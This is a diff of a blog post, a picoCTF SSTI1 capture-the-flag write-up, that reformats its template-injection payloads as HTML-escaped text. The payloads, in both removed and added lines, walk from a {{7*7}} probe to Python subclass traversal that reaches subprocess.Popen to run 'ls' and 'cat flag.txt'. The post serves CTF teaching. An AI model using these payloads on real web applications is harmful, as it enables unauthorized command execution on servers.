@@ -1,8 +1,8 @@
 ---
 layout: post
-title: PicoCTF_Web_Exploitation | SSTl1 |Easy
+title: PicoCTF_SSTl1_easy
 date: 13-05-2025
-categories: [documentation]
+categories: [PicoCTF]
 tag: [Easy CTF]
 
 ---
@@ -10,6 +10,11 @@ tag: [Easy CTF]
 Welcome to DarkR7 blogs.....
 
 # Heading
+
+```shell
+I am DarkR7...
+```
+
 
 # picoCTF 2024: SSTI1 Challenge Writeup
 
@@ -44,8 +49,7 @@ The page asks for input and returns it rendered back. This suggests it may be vu
 
 We enter a basic test string: 
 
-{{7*7}}
-
+**&#123;&#123;7*7&#125;&#125;**
 
 If the site returns `49`, then SSTI is confirmed.
 
@@ -58,7 +62,7 @@ If the site returns `49`, then SSTI is confirmed.
 To escalate, we inject the following payload to access built-ins:
 
 
-{{''.class.mro[2].subclasses()}}
+**&#123;&#123;''.class.mro[2].subclasses()&#125;&#125;**
 
 
 This gives access to all subclasses, including `Popen`.
@@ -71,7 +75,7 @@ This gives access to all subclasses, including `Popen`.
 
 We locate the index of `subprocess.Popen` subclass from the list and use it to execute code. Example:
 
-{{''.class.mro[2].subclasses()[<index>]("ls", shell=True, stdout=-1).communicate()}}
+**&#123;&#123;''.class.mro[2].subclasses()[&lt;index&gt;]("ls", shell=True, stdout=-1).communicate()&#125;&#125;**
 
 
 Try commands like `cat flag.txt`.
@@ -82,7 +86,7 @@ Try commands like `cat flag.txt`.
 
 Eventually, we find the flag using a working payload like:
 
-{{''.class.mro[2].subclasses()[<index>]("cat flag.txt", shell=True, stdout=-1).communicate()}}
+**&#123;&#123;''.class.mro[2].subclasses()[&lt;index&gt;]("cat flag.txt", shell=True, stdout=-1).communicate()&#125;&#125;**
 
 
 ![Flag Leaked](images/Screenshot_2025-05-13_14_51_15.png)
